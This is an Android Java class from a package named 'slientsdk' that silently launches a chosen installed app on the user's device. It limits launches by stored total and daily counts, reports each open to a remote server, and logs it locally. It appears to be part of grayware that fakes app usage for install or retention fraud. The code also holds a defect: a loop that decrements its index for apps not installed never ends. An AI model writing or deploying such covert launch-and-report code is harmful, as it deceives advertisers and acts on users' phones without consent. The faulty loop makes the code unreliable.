package sdk.grayweb.com.slientsdk.action;

import android.content.Context;
import android.content.Intent;

import java.sql.SQLException;
import java.util.Calendar;
import java.util.List;

import sdk.grayweb.com.slientsdk.api.Action;
import sdk.grayweb.com.slientsdk.api.ActionApi;
import sdk.grayweb.com.slientsdk.http.HttpClient;
import sdk.grayweb.com.slientsdk.http.TextHttpListener;
import sdk.grayweb.com.slientsdk.model.ActionModel;
import sdk.grayweb.com.slientsdk.model.ApkModel;

/**
 * Created by engine on 16/5/11.
 */
public class OpenAction extends  AbstractAction{
    public OpenAction(Context context) {
        super(context);
    }

    @Override
    public int doAction() {
        try {
            List<ApkModel> apkModels = apkModelDao.queryForAll();
            ApkModel targetApk =null ;
            for (int i=0;i<apkModels.size();i++){
                ApkModel model = apkModels.get(i);
                if (hasInstall(model.packagename)){
                    //需要打开
                    if (canOpen(model)){
                        if (targetApk==null){ targetApk=model;}else {
                           if (model.level>targetApk.level){
                               targetApk=model ;
                           }
                        }
                    }
                }else {
                    i-- ;
                }
            }
            //open package
            if (targetApk!=null) {
                Intent intent = mContext.getPackageManager().getLaunchIntentForPackage(targetApk.packagename);
                mContext.startActivity(intent);
                ActionModel actionModel = new ActionModel();
                actionModel.type = 3;
                actionModel.time = System.currentTimeMillis();
                actionModel.packageName = targetApk.packagename;
                ActionApi api = new ActionApi(mContext,actionModel.packageName,Action.OPEN);
                HttpClient.request(api, new TextHttpListener(mContext) {
                    @Override
                    public void onSuccess(String text) {

                    }
                });
                actionDao.create(actionModel) ;
                return  1 ;
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return 0;
    }

    /**
     * 如果打开次数没有达到 继续则可以打开
     * @param model
     * @return
     */
    private boolean canOpen(ApkModel model){
        try {
            List<ActionModel> list= actionDao.queryBuilder().where().eq("type",3).and().eq("packagename",model.packagename).query();
            if (list.size()>=model.needopentime) return  false;
            int isToday = 0 ;
            for (ActionModel a:list){
                //如果当天的打开次数大于2次则不打开
                Calendar today = Calendar.getInstance();
                Calendar time = Calendar.getInstance();
                time.setTimeInMillis(a.time);
                if (today.get(Calendar.DAY_OF_MONTH)==time.get(Calendar.DAY_OF_MONTH)){
                    isToday++;
                }
                if (isToday>model.dayopentimes) return false ;
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return true ;
    }
}
